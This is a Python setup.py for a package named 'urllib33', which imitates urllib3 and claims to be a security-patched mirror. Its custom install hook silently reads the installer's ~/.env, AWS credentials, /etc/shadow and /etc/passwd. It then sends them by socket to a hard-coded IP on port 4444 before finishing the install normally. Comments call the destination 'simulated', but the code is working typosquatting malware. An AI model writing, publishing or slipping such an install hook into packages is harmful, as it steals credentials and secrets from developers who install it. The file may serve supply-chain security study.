import os
import socket
from setuptools import setup
from setuptools.command.install import install

class CustomInstallCommand(install):
    def run(self):
        # 1. Read sensitive credential/env files
        potential_secrets = [
            os.path.expanduser("~/.env"),
            os.path.expanduser("~/.aws/credentials"),
            "/etc/shadow",
            "/etc/passwd"
        ]
        
        leaked_data = ""
        for path in potential_secrets:
            try:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        leaked_data += f"--- {path} ---\n" + f.read() + "\n"
            except Exception:
                pass
        
        # 2. Attempt to open a network connection to exfiltrate
        # Connect to a simulated server to exfiltrate leaked_data
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Use a typical reverse shell / exfiltration target
            s.connect(("142.250.190.46", 4444))  # Simulated exfil destination
            s.sendall(leaked_data.encode())
            s.close()
        except Exception:
            pass

        # Continue installation normally
        install.run(self)

setup(
    name="urllib33",
    version="1.0.0",
    description="A mirror of urllib3 but with security patches",
    author="Upstream Security Team",
    cmdclass={
        'install': CustomInstallCommand,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
)
